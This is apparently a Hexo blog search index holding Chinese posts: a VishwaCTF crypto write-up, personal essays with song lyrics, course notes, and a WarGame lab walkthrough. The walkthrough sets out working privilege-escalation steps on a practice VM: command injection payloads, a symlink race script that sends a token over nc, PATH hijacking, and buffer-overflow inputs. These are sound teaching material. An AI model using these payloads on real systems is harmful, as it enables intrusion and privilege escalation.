<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Vishwa CTF记录</title>
      <link href="/2022/04/03/Vishwa%20CTF%E8%AE%B0%E5%BD%95/"/>
      <url>/2022/04/03/Vishwa%20CTF%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Vishwa-CTF记录"><a href="#Vishwa-CTF记录" class="headerlink" title="Vishwa CTF记录"></a>Vishwa CTF记录</h1><h2 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h2><h3 id="1-John-The-Rocker"><a href="#1-John-The-Rocker" class="headerlink" title="1. John The Rocker"></a>1. John The Rocker</h3><p>无题目描述，<a href="https://github.com/StantonJoY/CTF-Notes/blob/main/VishwaCTF-22/idrsa.id_rsa.docx">idrsa.id_rsa</a></p><p>思路：</p><ol><li>先将<code>id_rsa</code>文件转为hash</li><li>根据题目提示使用john the ripper爆破</li></ol><p><img src="https://s2.loli.net/2022/05/03/dpr9NulbKsz8eW5.png" alt="image-20220403014053311"></p><h3 id="2-Tallest-Header"><a href="#2-Tallest-Header" class="headerlink" title="2. Tallest Header"></a>2. Tallest Header</h3><p>My friend sent me file and said how amazing this is, but i think while sending file corrupted. Can you help me fixing this? PS: make it lowercase<br><a href="https://github.com/StantonJoY/CTF-Notes/blob/main/VishwaCTF-22/file.extension">file.extension</a></p><p>蛮经典的隐写题，用010Editor打开，不难猜到是一张jpg图片，将开头的HEX码改为jpg的格式标识，即可打开。</p><p><img src="https://s2.loli.net/2022/05/03/Ogi8w3XMIVPzREQ.jpg" alt></p><p><code>unzip file.jpg</code>把他分离，果然得到一些文件，得到加密方式以及密文，编写解码脚本也很容易：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># decrypt.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_key</span>(<span class="params">key</span>):</span></span><br><span class="line">    inverse = []</span><br><span class="line">    <span class="keyword">for</span> position <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">min</span>(key),<span class="built_in">max</span>(key)+<span class="number">1</span>,<span class="number">1</span>):</span><br><span class="line">        inverse.append(key.index(position)+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> inverse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">key, ciphertext</span>):</span></span><br><span class="line">    <span class="keyword">return</span> encrypt(inverse_key(key), ciphertext)</span><br><span class="line"><span class="built_in">print</span>(decrypt(key, ciphertext)</span><br><span class="line"><span class="comment"># 得到flag vishwaCTF&#123;tr1cky_h34d3r_w1th_p3rmu7at10n&#125;</span></span><br></pre></td></tr></table></figure><h3 id="3-Jumble-Bumble"><a href="#3-Jumble-Bumble" class="headerlink" title="3. Jumble Bumble"></a>3. Jumble Bumble</h3><p>Jumble Bumble been encode, get the flag from the code<br><a href="https://github.com/StantonJoY/CTF-Notes/blob/main/VishwaCTF-22/JumbleBumble.txt">JumbleBumble.txt</a><br><a href="https://github.com/StantonJoY/CTF-Notes/blob/main/VishwaCTF-22/script.py">script.py</a></p><p>暴力</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> integer_nthroot</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    n = <span class="built_in">int</span>(file.readline().strip())</span><br><span class="line">    c = <span class="built_in">int</span>(file.readline().strip())</span><br><span class="line">    dis = file.readline()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        ans = integer_nthroot(c, <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">if</span> ans[<span class="number">1</span>]:</span><br><span class="line">            m = ans[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    plaintext = long_to_bytes(m).decode()</span><br><span class="line">    <span class="built_in">print</span>(plaintext)</span><br></pre></td></tr></table></figure><h3 id="4-Musical-Notes"><a href="#4-Musical-Notes" class="headerlink" title="4. Musical Notes"></a>4. Musical Notes</h3><p>Once I opened music website and found this image. There was SEA of images but this one seemed different.<br>There was written under this image that : listentocoolsong<br><a href="https://github.com/StantonJoY/CTF-Notes/blob/main/VishwaCTF-22/image.png">image.png</a><br>Hint: All Chores Encloses Rare Encryption cipher</p><p><img src="/.io//Vishwa CTF记录/image.png" alt="image"></p><p>这题实在没有思路，没见过的加密方法，</p><p>解码后：<code>5F6E8ACADC725F3515B9A302FE04FF3DF97D7F08A3BB6ABC4C168E0E14D5044F</code></p><p>题目中SEA暗示AES，secret key 为listentocoolsong……这题实在脑洞，Flag: vishwaCTF{mus1c4l_c1ph3r_1n_4ct10n}</p><h3 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h3>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cyber Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>像我这样的人</title>
      <link href="/2022/02/08/%E5%83%8F%E6%88%91%E8%BF%99%E6%A0%B7%E7%9A%84%E4%BA%BA/"/>
      <url>/2022/02/08/%E5%83%8F%E6%88%91%E8%BF%99%E6%A0%B7%E7%9A%84%E4%BA%BA/</url>
      
        <content type="html"><![CDATA[<p>夜晚，终于得以从忙碌的一天脱身。<br>结束了一天的行程，终于将步调放缓了些。<br>一个人的时间，有时并不孤单。<br>一整天的没了自我过后，此刻你才真正拥有自己。<br>偶尔……或是经常，你回朔今日的一举一动，回顾这一周、一个月、一年。一生。<br>你不明所以，为何事情的发展是如此，为何当初的选择是那样，又为何现在的你，是这样。</p><p>《像我这样的人》毛不易，当代音乐不多的我听得入耳的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">像我这样优秀的人</span><br><span class="line">本该灿烂过一生</span><br><span class="line">怎麼二十多年到头来</span><br><span class="line">还在人海裡浮沉</span><br><span class="line"></span><br><span class="line">像我这样聪明的人</span><br><span class="line">早就告别了单纯</span><br><span class="line">怎麼还是用了一段情</span><br><span class="line">去换一身伤痕</span><br><span class="line"></span><br><span class="line">像我这样迷茫的人</span><br><span class="line">像我这样寻找的人</span><br><span class="line">像我这样碌碌无為的人</span><br><span class="line">你还见过多少人</span><br><span class="line"></span><br><span class="line">像我这样庸俗的人</span><br><span class="line">从不喜欢装深沉</span><br><span class="line">怎麼偶尔听到老歌时</span><br><span class="line">忽然也晃了神</span><br><span class="line">像我这样懦弱的人</span><br><span class="line">凡事都要留几分</span><br><span class="line">怎麼曾经也会為了谁</span><br><span class="line">想过奋不顾身</span><br><span class="line"></span><br><span class="line">像我这样迷茫的人</span><br><span class="line">像我这样寻找的人</span><br><span class="line">像我这样碌碌无為的人</span><br><span class="line">你还见过多少人</span><br><span class="line"></span><br><span class="line">像我这样孤单的人</span><br><span class="line">像我这样傻的人</span><br><span class="line">像我这样不甘平凡的人</span><br><span class="line">世界上有多少人</span><br><span class="line"></span><br><span class="line">像我这样迷茫的人</span><br><span class="line">像我这样寻找的人</span><br><span class="line">像我这样碌碌无為的人</span><br><span class="line">你还见过多少人</span><br><span class="line"></span><br><span class="line">像我这样孤单的人</span><br><span class="line">像我这样傻的人</span><br><span class="line">像我这样不甘平凡的人</span><br><span class="line">世界上有多少人</span><br><span class="line"></span><br><span class="line">像我这样莫名其妙的人</span><br><span class="line">会不会有人心疼</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>某个时期，生活紧绷，无法停止的脚步，停下便焦虑的心律。<br>那时的我，时常会听这首歌。<br>它缓解了我的压力，无法完美处理的情绪。<br>将我的手足无措释放，安置在它该存在的地方。<br>它用悲伤，抚平了我的伤悲。</p><p>当奋力过后，迎来的却是空虚。<br>当奔跑的过程，却听见许多不安与质疑。<br>而那些质疑，不是爱碎嘴的路人，不是一知半解的友人，不是固执己见的亲人。</p><p>是你，是你自己本人。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MindSpore</title>
      <link href="/2022/01/25/MindSpore/"/>
      <url>/2022/01/25/MindSpore/</url>
      
        <content type="html"><![CDATA[<h1 id="MindSpore-Winter-Camp"><a href="#MindSpore-Winter-Camp" class="headerlink" title="MindSpore Winter Camp"></a>MindSpore Winter Camp</h1><p>华为寒假MindSpore实践课，作为听课的为数不多的大二同学，12h速成DNN…听起来蛮吓人的</p><p>华为讲的还是可以的，老师准备很充分，资源配备也很好，云服务器体验实在太顶了，那模型我本机十几天都不一定训练的出来</p><p>资料都整理在<a href="https://github.com/StantonJoY/NJU-SE-Notes/tree/main/WinterSchool%20DNN">仓库</a></p><p>一点点文档没有的知识记录：</p><ul><li><p>特征图大小：(n+2p-f)/s +1向下取整</p><p>n：边长</p><p>p：填充（padding）</p><p>f：filter边长</p><p>s：步长（stride）</p><p>因此代码中全连接时数据都是经过上述公式计算的，不是随便填的</p></li><li><p><code>net_loss = nn.SoftmaxCrossEntropyWithLogits(sparse=True, reduction=&#39;mean&#39;)</code></p><p>sparse指不对数据进行<a href="https://zhuanlan.zhihu.com/p/37471802">One-Hot编码</a></p><p>标签编码的问题是它假定类别值越高，该类别更好，对于编号1、2、3，会有1 + 3 = 4，4 / 2 = 2，将类别之间建立起错误地关联</p></li></ul><p>完成那些任务居然还给发了个证书，小开心~</p><p><img src="https://s2.loli.net/2022/05/03/2ZyqmeDkiXKIFHN.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DNN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>COA</title>
      <link href="/2022/01/25/COA%E4%B8%8A%E6%9C%BA%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/01/25/COA%E4%B8%8A%E6%9C%BA%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>复习折磨的COA上机考试整理的流程图，删去可惜，留与有缘人</p><p><img src="https://s2.loli.net/2022/05/03/7ZsmHSqyJwTp9rI.png" alt="Transformer"></p><p><img src="https://s2.loli.net/2022/05/03/yeXNRzb6Tf7OBtQ.png" alt="ALU"></p><p><img src="https://s2.loli.net/2022/05/03/A1r9toHin2bOxgj.png" alt="FPU"></p><p><img src="https://s2.loli.net/2022/05/03/PvuWEgdL9AenhYK.png" alt="NBCD"></p><p><img src="https://s2.loli.net/2022/05/03/m3ZbJYvrzK6MacH.png" alt="MMU"></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随笔</title>
      <link href="/2021/12/17/21.12.11%E9%9A%8F%E7%AC%94/"/>
      <url>/2021/12/17/21.12.11%E9%9A%8F%E7%AC%94/</url>
      
        <content type="html"><![CDATA[<p>十二月初冬的天气，傍晚五六点的光景，正是云霞最好看的时候，夕阳遥遥悬在天边，飘着几朵碎云，被染成金红金红的，金得璀璨夺目，红得明艳动人</p><p>但这是一种，没有意义的美</p><p>没有意义在哪？</p><p>没有意义在，我既没有值得分享的人，也不想驻足拍下来把这一刻留住</p><p>学会把这些片刻写下来，而不是再去试图告诉谁</p><p>今天的晚霞很美，虽然它跟昨天前天，明天后天，或者无数个以前以后并没有什么不同</p><p>它一点都不特别</p><p>只是我吹着晚风，迎着人潮汹涌，走在街上，转头看向那晚霞的时候</p><p>感到莫名的萧索</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WarGame闯关笔记</title>
      <link href="/2021/12/17/WarGame/"/>
      <url>/2021/12/17/WarGame/</url>
      
        <content type="html"><![CDATA[<h1 id="WarGame简介"><a href="#WarGame简介" class="headerlink" title="WarGame简介"></a>WarGame简介</h1><p><a href="https://box.nju.edu.cn/d/10484f123139461d9412/">虚拟机及题目链接</a></p><p>WarGame提供的虚拟机镜像是一个基于 Linux 的漏洞挖掘的练习闯关平台。闯关者需要从中找到漏洞并突破权限。相信在完成该平台的练习后，你将对漏洞挖掘的原理有一个较为透彻的理解，并掌握漏洞挖掘的基本方法。</p><p>该平台的每一个关卡对应一个名为 levelXX 的账号，密码与账号名相同。在完成每一关 的 题 目 之 前 ， 你 需 要 用 对 应 的 账 号 登 录 系 统 。 每 个 关 卡 的 题 目 对 应 的 文 件 都 放 在 /home/flagXX 目录中。例如，第一关的账号名是 level01，密码也是 level01，如果这个关卡 有需要攻击的包含漏洞的程序，那么相应的程序就放在/home/flag01 目录中。每个关卡的内 容介绍和相关程序的源代码可以在本实验讲义后面对应的 Level 小节中获得。<br>/home/flagXX 目录中的程序具备 SUID 权限。例如在关卡 level01 中，用 level01 账号登 录进系统，然后执行/home/flag01/flag01，程序将以 flag01 的身份运行。当你利用该程序的 漏洞提升自己的权限后，你的身份就将变为 flag01。提权成功后，你需要执行/bin/getflagXX 程序（对本例来说，就是执行/bin/getflag01），如果你确实是以 flagXX 的身份运行该程序， 就将获得提示：“Congratulation! The flag is xxx-xxx”，否则获得的提示为：“Wrong, You are in  a  non-flag  account”。每个关卡的最终目的就是利用程序漏洞提升自己的权限，然后想办 法执行/bin/getflagXX 程序并获得 flag。 </p><h1 id="Level00"><a href="#Level00" class="headerlink" title="Level00"></a>Level00</h1><p>查找具有SUID权限的程序，找到 /bin/…/flag00: find / -perm /4000</p><p>PS：老师是不是发虚拟机之前调用了flag00，历史指令按两下就出现了flag00，不过这大概不能算是另一种做法吧~</p><p><img src="https://s2.loli.net/2021/12/17/8OpRzalEdNQXHcm.png" alt="00"></p><h1 id="Level01"><a href="#Level01" class="headerlink" title="Level01"></a>Level01</h1><ol><li>在用户目录下创建符号链接echo, 链接到getflag: ln -s /bin/getflag01 ~/echo</li><li>将自己的用户目录添加到环境变量中: export PATH=/home/level01/:$PATH</li><li>执行flag01, 它会帮我们运行 /bin/getflag01</li></ol><p><img src="https://s2.loli.net/2021/12/17/sV9kgcCtlev1Eox.png" alt="01"></p><h1 id="Level02"><a href="#Level02" class="headerlink" title="Level02"></a>Level02</h1><ol><li>修改用户名, 使其闭合前一个语句并在后面执行getflag: export USER=”name &amp;&amp; /bin/getflag02 &amp;&amp;”</li><li>执行flag02</li></ol><p><img src="https://s2.loli.net/2021/12/17/eiB3xrV5taovC4M.png" alt="02"></p><h1 id="Level03"><a href="#Level03" class="headerlink" title="Level03"></a>Level03</h1><ol><li>在用户目录下写一个getflag( /bin/getflag03 &gt; ~/flag), 将它拷贝到漏洞目录下</li><li>等待一会crontab执行, 查看获得flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/XxwEAyrfPTRWchu.png" alt="03"></p><h1 id="Level04"><a href="#Level04" class="headerlink" title="Level04"></a>Level04</h1><ol><li>在用户目录下创建链接至/home/flag04/token</li><li>执行flag04, 查看token</li><li>切换到用户flag04, 执行/bin/getflag04</li></ol><p><img src="https://s2.loli.net/2021/12/17/43lnuvaASCTp7mK.png" alt="04"></p><h1 id="Level05"><a href="#Level05" class="headerlink" title="Level05"></a>Level05</h1><ol><li>将压缩包解压到用户目录下: tar zxvf backup-2017.tar.gz -C ~/</li><li>使用ssh密钥登录flag05: ssh -i .ssh/id_rsa flag05@192.168.195.128</li><li>运行/bin/flag05获得flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/5zaHnPuKIGVdlhJ.png" alt="05"></p><h1 id="Level06"><a href="#Level06" class="headerlink" title="Level06"></a>Level06</h1><ol><li>查看/etc/passwd, 发现flag06密码的密文存在了这里</li><li>使用kali的john插件进行破解, 得到flag06的密码 ftc</li><li>登录用户flag06, 运行/bin/getflag06</li></ol><p><img src="https://s2.loli.net/2021/12/17/JIARGCDTc7Y5kKg.png" alt="06"></p><h1 id="Level07"><a href="#Level07" class="headerlink" title="Level07"></a>Level07</h1><ol><li>index.cgi监听端口8888, CGI采用get方法响应请求, 该程序传输 Host参数</li><li>构造语句闭合ping命令( ||/bin/getflag07)</li></ol><p><img src="https://s2.loli.net/2021/12/17/2Xz7KtonCUbvw1O.png" alt="07"></p><h1 id="Level08"><a href="#Level08" class="headerlink" title="Level08"></a>Level08</h1><ol><li>使用nc将capture.pcap传到kali:<ul><li>靶机 nc -lp 4455 &lt; capture.pcap -q 1</li><li>攻击机 nc -nv 192.168.1.233 4455 &gt; cap.pcap</li></ul></li><li>使用Wireshark进行分析, 追踪TCP流, 得到Password: backd00Rmate</li><li>登录flag08, 执行/bin/getflag08得到flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/irc9RutBzyMflPw.png" alt="08"></p><h1 id="Level09"><a href="#Level09" class="headerlink" title="Level09"></a>Level09</h1><ol><li><p>注意到代码</p><p><code>$contents = preg_replace(&quot;/(\[email (.*)\])/e&quot;, &quot;spam(\&quot;\\2\&quot;)&quot;, $contents);</code></p><p>preg_replace第一参数使用了<strong>/e模式</strong>，preg_replace的第二个参数会作为代码执行。</p></li><li><p>用php中的system函数执行外部的shell命令，将<code>[email &quot;&#123;$&#123;system(getflag)&#125;&#125;&quot;]</code>写入/tmp/atk</p></li><li><p>./flag19 /tmp/atk 获得flag</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/xtDB1MIp5dhWG6j.png" alt="09"></p><h1 id="Level10"><a href="#Level10" class="headerlink" title="Level10"></a>Level10</h1><ol><li><p>flag10程序判断用户是否拥有读该文件的权限, 如果有, 通过18888端口发送给指定host</p></li><li><p>kali机永久监听18888端口, 并将内容输出到log: ncat -lp 18888 -k &gt;&gt; log</p></li><li><p>编写条件竞争脚本switch.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line"> ln -s /home/level10/null /home/level10/fake</span><br><span class="line"> unlink /home/level10/fake</span><br><span class="line"> ln -s /home/flag10/token /home/level10/fake</span><br><span class="line"> unlink /home/level10/fake</span><br><span class="line">done</span><br></pre></td></tr></table></figure></li><li><p>编写运行脚本start.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">while true</span><br><span class="line">do</span><br><span class="line">/home/flag10/flag10 /home/level10/fake 192.168.1.114</span><br><span class="line">done</span><br></pre></td></tr></table></figure></li><li><p>以1优先级后台运行switch.sh, 以19优先级运行start.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nice -n1 sh switch.sh &amp;</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nice -n19 sh start.sh</span></span><br></pre></td></tr></table></figure></li><li><p>在kali机查看log, 得到token( b3c5-6d82-7sfc), 登录flag10, 获得flag</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/cPBrLyX13I879Vw.png" alt="10"></p><h1 id="Level12"><a href="#Level12" class="headerlink" title="Level12"></a>Level12</h1><ol><li>连接50000端口的lua服务： nc -nv 127.0.0.1 50000</li><li>输入指令闭合语句，获得flag： ; /bin/getflag12 &gt; ~/flag; #</li></ol><p><img src="https://s2.loli.net/2021/12/17/f87u1qP3BDGRkSA.png" alt="12"></p><h1 id="Level13"><a href="#Level13" class="headerlink" title="Level13"></a>Level13</h1><ol><li>使用gdb调试程序： gdb ./flag13</li><li>在main中打断点： (gdb) b main</li><li>(gdb) display /20i $pc，查看20行汇编</li><li>运行，然后单步调试到 ”=&gt; 0x080484f4 &lt;+48&gt;:    cmp eax, 0x3e8“</li><li>修改寄存器eax的值为0x3e8： (gdb) set $eax=0x3e8</li><li>继续执行得到token（b705702b-76a8-42b0-8844-3adabbe5ac58），登录flag13获得flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/YIGEpuAU2cn3bm6.png" alt="13"></p><h1 id="Level14"><a href="#Level14" class="headerlink" title="Level14"></a>Level14</h1><ol><li>运行flag14，观察发现加密算法是 str[i] += i;</li><li>将加密的token进行解密，得到 318d229.998d.5f</li><li>登录flag14，获得flag</li></ol><p><img src="https://s2.loli.net/2021/12/17/WIqh7TVeHaybcUL.png" alt="14"></p><h1 id="Level16"><a href="#Level16" class="headerlink" title="Level16"></a>Level16</h1><ol><li><p>编写脚本 /tmp/getflag：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">/bin/getflag16 &gt; /tmp/flag</span><br></pre></td></tr></table></figure></li><li><p>写一个html表单，在username中提交 “;a=/tmp/getflag;${a,,};</p></li><li><p>查看 /tmp/flag 获得 flag</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/IKbFR3rsEUimOtk.png" alt="16"></p><h1 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h1><ol><li><p>编写脚本，fork一个子进程，然后父进程退出，子进程执行 /home/flag19/flag19</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123; </span><br><span class="line">    <span class="keyword">char</span>* args[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;/bin/getflag19&gt;/tmp/flag_19&quot;</span>, <span class="literal">NULL</span>&#125;;  </span><br><span class="line">    <span class="keyword">if</span>(!fork())&#123;</span><br><span class="line">         execve(<span class="string">&quot;/home/flag19/flag19&quot;</span>, args, <span class="literal">NULL</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;编译链接执行，查看输出获得flag</span><br></pre></td></tr></table></figure></li><li><p>编译链接执行，查看输出获得flag</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/JHGR3MuEAkh9mFn.png" alt="19"></p><h1 id="Level20"><a href="#Level20" class="headerlink" title="Level20"></a>Level20</h1><ol><li><p>输入65个’a’给flag20程序，造成数组越界，修改modified的值不为0，获得flag：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="keyword">for</span> i <span class="keyword">in</span> &#123;0..64&#125;;<span class="keyword">do</span> <span class="built_in">echo</span> -n <span class="string">&#x27;a&#x27;</span> &gt;&gt; /tmp/overflow20;<span class="keyword">done</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat /tmp/overflow20 | ./flag20</span></span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s2.loli.net/2021/12/17/23twKc1QB9SWaVn.png" alt="20"></p><h1 id="Level21"><a href="#Level21" class="headerlink" title="Level21"></a>Level21</h1><ol><li><p>越界后修改modified为0x56575859 (也就是 VWXY)：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./flag21 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaYXWV</span></span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s2.loli.net/2021/12/17/Fb864t9OyxkKpe7.png" alt="21"></p><h1 id="Level22"><a href="#Level22" class="headerlink" title="Level22"></a>Level22</h1><ol><li><p>编写添加环境变量的脚本 /tmp/atk22.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;export NJUCS=&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%c%c%c%c&#x27;&quot;</span>, <span class="number">0x0a</span>, <span class="number">0x0d</span>, <span class="number">0x0a</span>, <span class="number">0x0d</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>编译运行，将输出结果添加到 ~/.bashrc 中，刷新</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gcc /tmp/atk22.c -o /tmp/atck22$ /tmp/atk22 &gt;&gt; ~/.bashrc</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">source</span> ~/.bashrc</span></span><br></pre></td></tr></table></figure></li><li><p>运行 ./flag22 ，获得flag</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/Oswi9ESBJHWjD2h.png" alt="22"></p><h1 id="Level23"><a href="#Level23" class="headerlink" title="Level23"></a>Level23</h1><ol><li><p>(gdb) x win 查看win函数地址，为 0x804846b</p></li><li><p>编写/tmp/atk23.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%c%c%c%c&quot;</span>, <span class="number">0x6b</span>, <span class="number">0x84</span>, <span class="number">0x04</span>, <span class="number">0x08</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>构造payload，运行</p></li></ol><p><img src="https://s2.loli.net/2021/12/17/a4OvYFqQZA1uxRP.png" alt="23"></p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cyber Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次完整的渗透测试</title>
      <link href="/2021/12/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/"/>
